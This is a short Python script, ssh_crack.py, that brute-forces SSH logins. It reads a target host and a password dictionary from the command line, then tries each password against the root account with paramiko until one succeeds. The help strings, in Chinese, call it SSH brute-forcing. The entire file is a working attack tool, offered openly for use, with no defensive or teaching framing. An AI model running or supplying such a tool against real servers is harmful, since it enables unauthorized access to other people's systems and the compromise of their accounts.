#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/6/8 12:43
# @Author  : liugang9
# @Email   : mlcc330@hotmail.com
# @File    : ssh_crack.py
# @Software: PyCharm
# @license: Apache Licence
# @contact: 3323202070@qq.com

"""

"""

import logging
import argparse
import paramiko

# parser = argparse.ArgumentParser()
# parser.parse_args()

class SSHCrack:
    def __init__(self):
        self.user = 'root'
        logging.basicConfig(level=logging.INFO,format='%(asctime)s %(filename)s:%(funcName)s[%(lineno)d] - %(levelname)s: %(message)s')
        args = self.parse_args()
        self.target = args.target
        self.dict = args.dict

    def connect(self,target,user,pwd):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            logging.info('Try to connect %s with user (%s) pass (%s)', target, user, pwd)
            client.connect(target,username=user,password=pwd,timeout=10)
        except paramiko.ssh_exception.AuthenticationException as e:
            return False

        return True

    def crack(self):
        with open(self.dict) as f:
            for line in f:
                pwd = line.strip('\n')
                success = self.connect(self.target,self.user,pwd)
                if success:
                    break

    def parse_args(self):
        parser = argparse.ArgumentParser(description=u"SSH爆破")
        parser.add_argument("-t","--target",type=str,required=True,help=u"爆破目标")
        parser.add_argument("-d","--dict",type=str,required=True,help=u"密码字典")
        args = parser.parse_args()
        return args

if __name__ == '__main__':
    ssh_crack = SSHCrack()
    ssh_crack.crack()
